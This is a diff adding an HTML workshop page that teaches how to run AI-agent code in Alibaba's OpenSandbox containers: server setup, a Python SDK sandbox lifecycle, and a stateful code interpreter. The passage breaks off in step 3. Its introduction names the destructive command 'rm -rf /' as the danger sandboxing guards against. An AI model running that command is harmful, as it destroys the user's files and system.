@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OpenSandbox: Safe Code Execution Environments for AI Agents — Tinker</title>
+  <style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;0,9..144,800;1,9..144,400&family=IBM+Plex+Mono:wght@400;500;600&display=swap');
+:root {
+  --bg: #F7F4F0;
+  --bg-subtle: #EFEBE5;
+  --bg-elevated: #FFFDF9;
+  --ink: #1C1917;
+  --ink-secondary: #57534E;
+  --muted: #A8A29E;
+  --accent: #2B6B6B;
+  --accent-hover: #1F5252;
+  --accent-light: rgba(43,107,107,0.06);
+  --accent-subtle: rgba(43,107,107,0.14);
+  --blue: #3B82F6;
+  --red: #EF4444;
+  --yellow: #EAB308;
+  --green: #22C55E;
+  --surface: #EFEBE5;
+  --border: #DDD7CF;
+  --border-subtle: #EFEBE5;
+  --shadow-sm: 0 1px 2px rgba(0,0,0,0.04);
+  --shadow-md: 0 2px 8px rgba(0,0,0,0.06), 0 0 0 1px rgba(0,0,0,0.03);
+  --shadow-lg: 0 4px 16px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.02);
+  --mono: 'IBM Plex Mono', monospace;
+  --display: 'Fraunces', Georgia, serif;
+  --sans: 'Inter', -apple-system, system-ui, sans-serif;
+  --max-w: 680px;
+  --max-w-wide: 780px;
+  --radius-sm: 4px;
+  --radius-md: 8px;
+  --radius-lg: 12px;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--ink);
+  min-height: 100vh;
+  -webkit-font-smoothing: antialiased;
+  line-height: 1.7;
+  font-size: 17px;
+  border-top: 3px solid var(--accent);
+}
+
+/* ── Track color worlds ── */
+body.track-general { /* default teal — uses :root values */ }
+body.track-image-gen { --accent: #C4563A; --accent-hover: #A8452E; --accent-light: rgba(196,86,58,0.06); --accent-subtle: rgba(196,86,58,0.14); }
+body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: rgba(107,91,149,0.06); --accent-subtle: rgba(107,91,149,0.14); }
+
+/* ── Layout ── */
+.session-container {
+  max-width: var(--max-w);
+  margin: 0 auto;
+  padding: 0 1.5rem 5rem;
+}
+
+/* ── Back link ── */
+.back-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  font-family: var(--sans);
+  font-size: 0.8rem;
+  font-weight: 500;
+  color: var(--muted);
+  text-decoration: none;
+  padding: 2rem 0 1.25rem;
+  transition: color 0.15s;
+}
+.back-link:hover { color: var(--accent); }
+
+/* ── Hero ── */
+.session-hero {
+  padding: 1rem 0 2.5rem;
+  margin-bottom: 2rem;
+  border-bottom: 1px solid var(--border);
+}
+.session-hero .hero-tag {
+  display: inline-block;
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  color: var(--accent);
+  background: var(--accent-light);
+  padding: 0.3rem 0.75rem;
+  margin-bottom: 1.25rem;
+  border-radius: var(--radius-sm);
+}
+.session-hero h1 {
+  font-family: var(--display);
+  font-size: 2.5rem;
+  font-weight: 800;
+  line-height: 1.15;
+  letter-spacing: -0.025em;
+  margin-bottom: 0.6rem;
+  font-optical-sizing: auto;
+}
+.session-hero .hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--ink-secondary);
+  font-weight: 400;
+  line-height: 1.5;
+}
+.session-hero .hero-meta {
+  display: flex;
+  gap: 1.25rem;
+  margin-top: 1.25rem;
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  color: var(--muted);
+  letter-spacing: 0.02em;
+}
+.hero-meta .tag {
+  display: inline-block;
+  background: var(--surface);
+  padding: 0.2rem 0.55rem;
+  font-size: 0.65rem;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+}
+
+/* ── Section divider ── */
+.section-divider {
+  border: none;
+  width: 32px;
+  height: 2px;
+  background: var(--accent);
+  margin: 3rem 0;
+}
+
+/* ── Context block ── */
+.context-block {
+  background: var(--bg-elevated);
+  padding: 1.5rem 1.75rem;
+  margin-bottom: 2.5rem;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--border);
+}
+.context-block h2 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 0.75rem;
+}
+.context-block p { margin-bottom: 0.75rem; }
+.context-block p:last-child { margin-bottom: 0; }
+
+/* ── Steps ── */
+.step-section { margin-bottom: 3rem; }
+.step-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 1rem;
+  margin-bottom: 1.25rem;
+}
+.step-number {
+  flex-shrink: 0;
+  width: 44px; height: 44px;
+  background: var(--ink);
+  color: #fff;
+  font-family: var(--mono);
+  font-size: 0.9rem;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: var(--radius-sm);
+}
+.step-header h2 {
+  font-family: var(--display);
+  font-size: 1.3rem;
+  font-weight: 700;
+  line-height: 1.25;
+  padding-top: 0.35rem;
+}
+.step-body p { margin-bottom: 0.75rem; }
+.step-body ul, .step-body ol { margin: 0.5rem 0 0.75rem 1.5rem; }
+.step-body li { margin-bottom: 0.35rem; }
+.step-body strong { font-weight: 600; }
+.step-body a { color: var(--accent); text-decoration: underline; text-decoration-color: var(--accent-subtle); text-underline-offset: 2px; }
+.step-body a:hover { text-decoration-color: var(--accent); }
+
+/* ── Code blocks ── */
+.code-block {
+  position: relative;
+  margin: 1.25rem 0;
+  background: var(--ink);
+  border-radius: var(--radius-md);
+  overflow: hidden;
+}
+.code-caption {
+  display: block;
+  padding: 0.55rem 1rem;
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 500;
+  color: rgba(255,255,255,0.4);
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  letter-spacing: 0.03em;
+}
+.code-block pre {
+  padding: 1rem;
+  overflow-x: auto;
+  margin: 0;
+  background: transparent;
+}
+.code-block code {
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  line-height: 1.6;
+  color: #E4E4E7;
+}
+.copy-btn {
+  position: absolute;
+  top: 0.45rem;
+  right: 0.5rem;
+  font-family: var(--mono);
+  font-size: 0.55rem;
+  font-weight: 600;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  background: rgba(255,255,255,0.1);
+  color: rgba(255,255,255,0.5);
+  border: none;
+  padding: 0.25rem 0.55rem;
+  cursor: pointer;
+  transition: all 0.15s;
+  border-radius: var(--radius-sm);
+}
+.copy-btn:hover { background: rgba(255,255,255,0.2); color: #fff; }
+.copy-btn.copied { background: var(--green); color: #fff; }
+
+/* ── Callouts ── */
+.callout {
+  padding: 1rem 1.25rem;
+  margin: 1.25rem 0;
+  font-size: 0.92rem;
+  border-radius: var(--radius-md);
+  border: 1px solid;
+  background: var(--bg-elevated);
+}
+.callout-tip {
+  border-color: rgba(43,107,107,0.2);
+  background: rgba(43,107,107,0.04);
+}
+.callout-warning {
+  border-color: rgba(196,86,58,0.3);
+  background: rgba(196,86,58,0.04);
+}
+.callout-api-key-note {
+  border-color: rgba(202,138,4,0.25);
+  background: rgba(202,138,4,0.04);
+}
+.callout-label {
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  margin-bottom: 0.35rem;
+}
+.callout-tip .callout-label { color: var(--accent); }
+.callout-warning .callout-label { color: #B84533; }
+.callout-api-key-note .callout-label { color: #CA8A04; }
+
+/* ── Reveals (details/summary) ── */
+.reveal {
+  margin: 1rem 0;
+  border-radius: var(--radius-md);
+  overflow: hidden;
+  border: 1px solid var(--border);
+  background: var(--bg-elevated);
+}
+.reveal summary {
+  font-family: var(--sans);
+  font-size: 0.85rem;
+  font-weight: 600;
+  padding: 0.75rem 1rem;
+  cursor: pointer;
+  background: var(--bg-elevated);
+  list-style: none;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  transition: background 0.15s;
+}
+.reveal summary:hover { background: var(--surface); }
+.reveal summary::before {
+  content: "+";
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  font-weight: 600;
+  color: var(--accent);
+}
+.reveal[open] summary::before {
+  content: "\2212";
+}
+.reveal .reveal-body {
+  padding: 1rem;
+  border-top: 1px solid var(--border);
+  font-size: 0.92rem;
+}
+.reveal .reveal-body p { margin-bottom: 0.5rem; }
+.reveal .reveal-body p:last-child { margin-bottom: 0; }
+
+/* ── Checkpoint ── */
+.checkpoint {
+  display: flex;
+  align-items: center;
+  gap: 0.85rem;
+  padding: 0.85rem 1.25rem;
+  background: var(--accent-light);
+  color: var(--ink);
+  margin: 2rem 0;
+  font-family: var(--sans);
+  font-size: 0.85rem;
+  font-weight: 600;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--accent-subtle);
+}
+.checkpoint-icon {
+  flex-shrink: 0;
+  width: 26px; height: 26px;
+  background: var(--accent);
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.75rem;
+  color: #fff;
+}
+
+/* ── Decision point ── */
+.decision-point {
+  margin: 2rem 0;
+  padding: 1.5rem;
+  border-radius: var(--radius-md);
+  background: var(--bg-elevated);
+  border: 1px solid var(--border);
+}
+.decision-point h3 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+}
+.decision-point .question {
+  font-family: var(--display);
+  font-size: 1.1rem;
+  font-weight: 600;
+  margin-bottom: 1rem;
+  line-height: 1.35;
+}
+.decision-option {
+  margin-bottom: 0.5rem;
+}
+.decision-option input[type="radio"] {
+  display: none;
+}
+.decision-option label {
+  display: block;
+  padding: 0.7rem 1rem;
+  background: var(--surface);
+  border: 1.5px solid var(--border);
+  cursor: pointer;
+  transition: all 0.15s;
+  font-weight: 500;
+  font-size: 0.92rem;
+  border-radius: var(--radius-md);
+}
+.decision-option label:hover {
+  background: var(--accent-light);
+  border-color: var(--accent);
+}
+.decision-option input:checked + label {
+  border-color: var(--accent);
+  background: var(--accent-light);
+}
+.decision-feedback {
+  display: none;
+  padding: 0.65rem 0.85rem;
+  margin-top: 0.35rem;
+  font-size: 0.85rem;
+  border-left: 3px solid;
+  border-radius: var(--radius-sm);
+}
+.decision-option input:checked ~ .decision-feedback {
+  display: block;
+}
+.decision-feedback.correct {
+  border-color: #3D9A6D;
+  background: rgba(61,154,109,0.06);
+  color: #2D7A54;
+}
+.decision-feedback.incorrect {
+  border-color: #C4563A;
+  background: rgba(196,86,58,0.05);
+  color: #A8452E;
+}
+
+/* ── Agent interaction ── */
+.agent-interaction {
+  margin: 1.5rem calc((var(--max-w) - var(--max-w-wide)) / 2);
+  border-radius: var(--radius-md);
+  overflow: hidden;
+  border: 1px solid var(--border);
+}
+.agent-goal {
+  padding: 1rem 1.25rem;
+  background: var(--ink);
+  color: #E4E4E7;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  font-weight: 500;
+  line-height: 1.5;
+}
+.agent-goal::before {
+  content: none;
+}
+.agent-goal-label {
+  font-size: 0.55rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  margin-bottom: 0.4rem;
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  color: rgba(255,255,255,0.35);
+}
+.agent-goal-label::before {
+  content: "";
+  display: inline-block;
+  width: 6px; height: 6px;
+  background: var(--green);
+  border-radius: 50%;
+}
+.agent-hints {
+  padding: 1rem 1.25rem;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+}
+.agent-hints-label {
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+}
+.agent-hints ul {
+  list-style: none;
+  padding: 0;
+}
+.agent-hints li {
+  padding: 0.3rem 0 0.3rem 1.25rem;
+  position: relative;
+  font-size: 0.9rem;
+  font-style: italic;
+  color: var(--ink-secondary);
+}
+.agent-hints li::before {
+  content: "\203A";
+  position: absolute;
+  left: 0;
+  color: var(--accent);
+  font-weight: 700;
+  font-style: normal;
+  font-family: var(--mono);
+}
+
+/* Agent interaction reveals */
+.agent-interaction .reveal {
+  border-radius: 0;
+  border: none;
+  border-top: 1px solid var(--border);
+}
+.agent-interaction .reveal summary {
+  font-size: 0.8rem;
+  background: var(--surface);
+}
+
+/* ── Your turn ── */
+.your-turn {
+  padding: 1.5rem;
+  margin: 2rem 0;
+  border-radius: var(--radius-md);
+  background: var(--accent-light);
+  border: 1.5px solid var(--accent-subtle);
+}
+.your-turn h3 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+}
+.your-turn .your-turn-goal {
+  font-family: var(--sans);
+  font-size: 1.05rem;
+  font-weight: 600;
+  margin-bottom: 0.75rem;
+  line-height: 1.4;
+}
+.your-turn .your-turn-context {
+  font-size: 0.92rem;
+  color: var(--ink-secondary);
+  margin-bottom: 1rem;
+}
+
+/* ── Recap ── */
+.recap-section {
+  padding-top: 2.5rem;
+  margin-top: 3rem;
+  border-top: 1px solid var(--border);
+}
+.recap-section h2 {
+  font-family: var(--display);
+  font-size: 1.35rem;
+  font-weight: 700;
+  margin-bottom: 1rem;
+}
+.recap-body { margin-bottom: 1.5rem; }
+.recap-body p { margin-bottom: 0.75rem; }
+.takeaways-list {
+  list-style: none;
+  padding: 0;
+  margin-bottom: 1.5rem;
+}
+.takeaways-list li {
+  padding: 0.55rem 0 0.55rem 1.75rem;
+  position: relative;
+  font-size: 0.95rem;
+}
+.takeaways-list li::before {
+  content: "\2713";
+  position: absolute;
+  left: 0;
+  color: var(--green);
+  font-weight: 700;
+  font-size: 0.85rem;
+}
+.next-steps h3 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.5rem;
+}
+.next-steps ul {
+  list-style: none;
+  padding: 0;
+}
+.next-steps li {
+  padding: 0.3rem 0 0.3rem 1.5rem;
+  position: relative;
+}
+.next-steps li::before {
+  content: "\2192";
+  position: absolute;
+  left: 0;
+  color: var(--accent);
+  font-weight: 700;
+}
+
+/* ── Sources ── */
+.sources-section {
+  margin-top: 2.5rem;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--border);
+}
+.sources-section h3 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.75rem;
+}
+.sources-list {
+  list-style: none;
+  padding: 0;
+}
+.sources-list li {
+  padding: 0.3rem 0;
+}
+.sources-list a {
+  color: var(--accent);
+  text-decoration: underline;
+  text-decoration-color: var(--accent-subtle);
+  text-underline-offset: 2px;
+  font-size: 0.9rem;
+}
+.sources-list a:hover { text-decoration-color: var(--accent); }
+.sources-list .source-name {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  color: var(--muted);
+  margin-left: 0.35rem;
+}
+
+/* ── Other articles ── */
+.other-articles {
+  margin-top: 2.5rem;
+  padding-top: 1.5rem;
+}
+.other-articles h3 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.25rem;
+}
+.other-articles .oa-intro {
+  font-size: 0.82rem;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.other-article-card {
+  padding: 0.85rem 1rem;
+  margin-bottom: 0.5rem;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  border-radius: var(--radius-md);
+  background: var(--bg-elevated);
+  border: 1px solid var(--border);
+  transition: all 0.15s;
+}
+.other-article-card:hover {
+  border-color: var(--accent-subtle);
+  background: var(--accent-light);
+}
+.oa-info {
+  flex: 1;
+  min-width: 0;
+}
+.oa-title {
+  font-weight: 600;
+  font-size: 0.9rem;
+  margin-bottom: 0.1rem;
+}
+.oa-summary {
+  font-size: 0.82rem;
+  color: var(--ink-secondary);
+  margin: 0.1rem 0;
+  line-height: 1.4;
+}
+.oa-meta {
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  color: var(--muted);
+  letter-spacing: 0.02em;
+}
+.oa-votes {
+  display: flex;
+  gap: 0.25rem;
+  flex-shrink: 0;
+}
+.oa-toggle {
+  display: none;
+}
+.oa-toggle-label {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 34px; height: 34px;
+  font-size: 0.9rem;
+  border: 1px solid var(--border);
+  cursor: pointer;
+  transition: all 0.15s;
+  background: var(--bg-elevated);
+  user-select: none;
+  border-radius: var(--radius-sm);
+}
+.oa-toggle-label:hover {
+  background: var(--surface);
+  border-color: var(--muted);
+}
+.oa-toggle:checked + .oa-toggle-label.vote-up {
+  background: rgba(61,154,109,0.1);
+  border-color: #3D9A6D;
+  color: #3D9A6D;
+}
+.oa-toggle:checked + .oa-toggle-label.vote-down {
+  background: rgba(196,86,58,0.08);
+  border-color: #C4563A;
+  color: #C4563A;
+}
+.oa-submit-row {
+  margin-top: 1rem;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.oa-submit-btn {
+  font-family: var(--sans);
+  font-size: 0.8rem;
+  font-weight: 600;
+  padding: 0.55rem 1.25rem;
+  background: var(--ink);
+  color: #fff;
+  border: none;
+  cursor: pointer;
+  transition: all 0.15s;
+  border-radius: var(--radius-md);
+}
+.oa-submit-btn:hover { background: #27272A; }
+.oa-submit-btn:disabled {
+  background: var(--border);
+  color: var(--muted);
+  cursor: default;
+}
+.oa-submit-hint {
+  font-size: 0.75rem;
+  color: var(--muted);
+}
+
+/* ── Footer ── */
+.session-footer {
+  text-align: center;
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  margin-top: 4rem;
+  padding: 1.5rem 0 2.5rem;
+  border-top: 1px solid var(--border);
+}
+.session-footer span { color: var(--ink); font-weight: 600; }
+
+/* ── Responsive ── */
+@media (max-width: 600px) {
+  body { font-size: 16px; }
+  .session-hero h1 { font-size: 1.75rem; }
+  .step-number { width: 36px; height: 36px; font-size: 0.8rem; }
+  .session-container { padding: 0 1.15rem 3rem; }
+  .hero-meta { flex-wrap: wrap; gap: 0.75rem; }
+  .agent-interaction { margin-left: 0; margin-right: 0; }
+}
+@media (prefers-reduced-motion: reduce) {
+  * { transition: none !important; }
+}
+</style>
+</head>
+<body class="track-general">
+  <div class="session-container">
+    <a href="../index.html" class="back-link">&larr; Back to calendar</a>
+    
+    <div class="session-hero">
+      <div class="hero-tag">Workshop</div>
+      <h1>OpenSandbox: Let Your AI Agents Run Code Without Burning Your House Down</h1>
+      <div class="hero-subtitle">Alibaba just open-sourced a sandbox platform that gives AI agents isolated environments to execute code, browse the web, and interact with desktops — all without touching your real machine.</div>
+      <div class="hero-meta">
+        <span>35 min</span>
+        <span> <span class="tag">sandboxing</span> <span class="tag">agent-infrastructure</span> <span class="tag">code-execution</span> <span class="tag">docker</span> <span class="tag">kubernetes</span></span>
+      </div>
+    </div>
+    <div class="context-block">
+      <h2>What's happening</h2>
+      <p>Here&#x27;s the problem that&#x27;s been quietly bugging everyone building AI agents: <strong>you want your agent to run code, but you don&#x27;t want it to <code>rm -rf /</code> your laptop.</strong></p>
+
+<p>Every coding assistant — Claude Code, Cursor, Devin, you name it — eventually needs to <em>execute</em> something. Test a function. Install a dependency. Run a script. But giving an LLM raw access to your terminal is like handing your car keys to someone who learned to drive from YouTube.</p>
+
+<p>Alibaba just dropped <strong>OpenSandbox</strong> as an open-source project, and it&#x27;s genuinely useful. It&#x27;s a platform that spins up isolated Docker (or Kubernetes) containers on demand, gives your AI agent a clean environment to work in, and tears it all down when it&#x27;s done. Think of it like a disposable laptop that exists for 10 minutes, lets your agent do whatever it wants, and then vanishes.</p>
+
+<p>The cool part? It has SDKs for Python, TypeScript, Java, Go, and more — so you can wire it into basically any agent framework. It supports code interpreters (think Jupyter-style execution), file I/O, shell commands, even browser automation. And it has network egress controls so your sandbox can&#x27;t phone home to sketchy servers.</p>
+
+<p>Today we&#x27;re going to set it up locally, get an agent to build us a sandbox workflow, and explore how this fits into real agent architectures.</p>
+    </div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">1</div>
+        <h2>Get the Sandbox Server Running Locally</h2>
+      </div>
+      <div class="step-body">
+        <p>Before we do anything fancy, we need the OpenSandbox server running on our machine. This is the thing that actually manages container lifecycles — creating sandboxes, killing them, routing commands to them.</p>
+
+<p>The mental model here is simple: <strong>OpenSandbox Server is like a hotel front desk for containers.</strong> Your agent checks in (creates a sandbox), does its thing in the room (runs code), and checks out (sandbox gets destroyed). The front desk handles all the logistics.</p>
+
+<p>You need Docker installed and running — that&#x27;s the only real prerequisite. OpenSandbox uses Docker containers under the hood for local development (and can scale to Kubernetes for production).</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to walk you through installing and starting the OpenSandbox server locally with Docker
+        </div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>What are the prerequisites the server needs? (Think: runtime, Python version)</li><li>There&#x27;s a pip-installable server package and a config initialization step — what would you ask the agent to set up?</li><li>How would you tell the agent you want the Docker-based local configuration, not the Kubernetes one?</li></ul>
+        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should give you a short sequence of three terminal commands: install the <code>opensandbox-server</code> package via <code>uv pip</code>, run the config initializer pointed at Docker mode, and then start the server. Something like:</p>
+
+<p>```bash</p>
+<p>uv pip install opensandbox-server</p>
+<p>opensandbox-server init-config ~/.sandbox.toml --example docker</p>
+<p>opensandbox-server</p>
+<p>```</p>
+
+<p>It might also mention that you can clone the repo and run from source if you prefer, but the pip install path is cleaner for getting started.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-warning">
+        <div class="callout-label">Warning</div>
+        Docker must be running before you start the server. If you&#x27;re on macOS, make sure Docker Desktop is open — the daemon won&#x27;t be running otherwise.
+      </div>
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        The config file at <code>~/.sandbox.toml</code> controls everything — runtime type, default timeouts, network policies. We&#x27;ll poke at it later, but for now the example Docker config works out of the box.
+      </div>
+        
+      <details class="reveal">
+        <summary>What&#x27;s actually happening when the server starts?</summary>
+        <div class="reveal-body"><p>The OpenSandbox server is a Python service that exposes a REST API for sandbox lifecycle management. When you create a sandbox, it tells Docker to spin up a container from a specific image (like <code>opensandbox/code-interpreter:v1.0.1</code>). When you run a command, it exec&#x27;s into that container. When you kill the sandbox, it stops and removes the container.</p>
+
+<p>This is basically what cloud notebook platforms like Google Colab do — but as an API you can wire into any agent. The key insight is that the <em>protocol</em> is standardized, so any SDK in any language can talk to the same server.</p></div>
+      </details>
+      </div>
+    </div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">2</div>
+        <h2>Create Your First Sandbox and Run Code In It</h2>
+      </div>
+      <div class="step-body">
+        <p>Now the fun part. We&#x27;re going to use the Python SDK to create a sandbox, run a shell command, write a file, and read it back. This is the bread and butter of what your AI agents will do.</p>
+
+<p>Think of a sandbox like a <strong>fresh virtual machine that boots in seconds</strong>. It has its own filesystem, its own shell, its own Python installation. Your agent can do anything inside it — install packages, create files, run scripts — and nothing leaks out to your real machine.</p>
+
+<p>The lifecycle is dead simple:</p>
+<ol>
+<li><strong>Create</strong> — spin up a container from an image</li>
+<li><strong>Use</strong> — run commands, read/write files, execute code</li>
+<li><strong>Kill</strong> — destroy the container and all its contents</li>
+</ol>
+
+<p>Let&#x27;s get our agent to build us a script that does all three.</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to build a Python script that creates an OpenSandbox sandbox, runs a shell command, writes and reads a file, then cleans up
+        </div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>The SDK has two key packages: `opensandbox` for the sandbox itself and `opensandbox-code-interpreter` for running code. Which do we need for this step?</li><li>Sandboxes are async — how should you tell the agent to structure the script?</li><li>What image should the sandbox use? Think about what built-in images OpenSandbox provides.</li><li>Don&#x27;t forget cleanup — what happens if the script crashes before killing the sandbox?</li></ul>
+        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should give you an async Python script that creates a sandbox using <code>Sandbox.create()</code> with the code interpreter image, uses <code>async with sandbox</code> for safe cleanup, runs <code>echo</code> via <code>sandbox.commands.run()</code>, writes a file with <code>sandbox.files.write_files()</code>, and reads it back with <code>sandbox.files.read_file()</code>. The key pattern to notice is:</p>
+
+<p>```python</p>
+<p>sandbox = await Sandbox.create(</p>
+<p>&quot;opensandbox/code-interpreter:v1.0.1&quot;,</p>
+<p>timeout=timedelta(minutes=10),</p>
+<p>)</p>
+<p>async with sandbox:</p>
+<p>result = await sandbox.commands.run(&quot;echo hello&quot;)</p>
+<h1>... do stuff ...</h1>
+<p>```</p>
+
+<p>The <code>async with</code> block is the important bit — it ensures the sandbox gets killed even if your code throws an error. Think of it like a <code>finally</code> block for infrastructure.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        The <code>timeout</code> parameter is your safety net. If your agent gets stuck in an infinite loop inside the sandbox, it&#x27;ll auto-destroy after the timeout. For development, 10 minutes is fine. For production agents, you might want 2-5 minutes.
+      </div>
+        
+      <details class="reveal">
+        <summary>Why async? Can&#x27;t I just use regular Python?</summary>
+        <div class="reveal-body"><p>OpenSandbox is async-first because sandbox operations involve network calls to the server (which talks to Docker). If you made these synchronous, your agent would be sitting there blocked every time it runs a command or reads a file. With async, you can potentially manage multiple sandboxes concurrently — which matters a lot in evaluation pipelines where you might be testing 50 code submissions at once.</p>
+
+<p>If you&#x27;re not comfortable with async Python, don&#x27;t sweat it. The pattern is always the same: <code>await</code> before any sandbox operation, and wrap everything in an <code>async def main()</code> that you kick off with <code>asyncio.run(main())</code>. Your agent can handle the boilerplate.</p></div>
+      </details>
+      </div>
+    </div>
+    <div class="checkpoint">
+      <div class="checkpoint-icon">&#10003;</div>
+      <div>At this point, you should have the OpenSandbox server running locally via Docker, and you&#x27;ve successfully created a sandbox, run a command, and done file I/O. The sandbox was automatically cleaned up. You&#x27;ve got the basic lifecycle down — create, use, destroy.</div>
+    </div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">3</div>
+        <h2>Add a Code Interpreter — Now Your Agent Can Run Real Code</h2>
+      </div>
+      <div class="step-body">
+        <p>Shell commands are fine, but the real power is the <strong>Code Interpreter</strong>. This is basically a Jupyter kernel running inside your sandbox. Your agent can send Python code (or other languages), get the output back, and iterate — just like ChatGPT&#x27;s Code Interpreter, except you control the infrastructure.</p>
+
+<p>Here&#x27;s why this matters for agent builders: when your LLM generates code, you need to <em>test</em> that code somewhere safe before trusting it. The Code Interpreter gives you a stateful execution environment — variables persist between runs, imports stick around, you can build up complex computations step by step.</p>
+
+<p>The analogy: if a sandbox is a disposable laptop, the Code Interpreter is <strong>opening a Python REPL on that laptop</strong>. It remembers what you did last, and you can keep building on it.</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to extend your sandbox script to create a Code Interpreter, run some Python code, and show how state persists between executions
+        </div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>The Code Interpreter is created FROM an existing sandbox — what does that API call look like?</li><li>How would you demonstrate that the interpreter is stateful? Maybe define a variable in one call and use it in the next?</li><li>What language parameter does the interpreter need? OpenSandbox supports multiple languages.</li></ul>
+        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should add a <code>CodeInterpreter.create(sandbox)</code> call inside your existing sandbox context, then show two sequential <code>interpreter.codes.run()</code> calls — the first defines a variable, the second uses it. This proves the interpreter maintains state between runs. The key pattern:</p>
+
+<p>```python</p>
+<p>interpreter = await CodeInterpreter.create(sandbox)</p>
+<p>result1 = await interpreter.codes.run(</p>
+<p>&quot;x = 42&quot;, language=SupportedLanguage.PYTHON</p>
+<p>)</p>
+<p>result2 = await interpreter.codes.run(</p>
+<p>&quot;print(x * 2)&quot;, language=SupportedLanguage.PYTHON</p>
+<p>)</p>
+<h1>result2 prints 84 — state persisted!</h1>
+<p>```</p>
+
+<p>The agent should explain that this is like having a persistent REPL session, not just running scripts in isolation.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        The <code>SupportedLanguage</code> enum tells the interpreter which kernel to use. Python is the most common, but check OpenSandbox docs for other supported languages. Your agent can help you explore what&#x27;s available.
+      </div>
+      <div class="callout callout-warning">
+        <div class="callout-label">Warning</div>
+        The Code Interpreter image (<code>opensandbox/code-interpreter:v1.0.1</code>) needs to be pulled the first time. If sandbox creation seems slow, that&#x27;s Docker downloading the image — subsequent runs will be fast.
+      </div>
+        
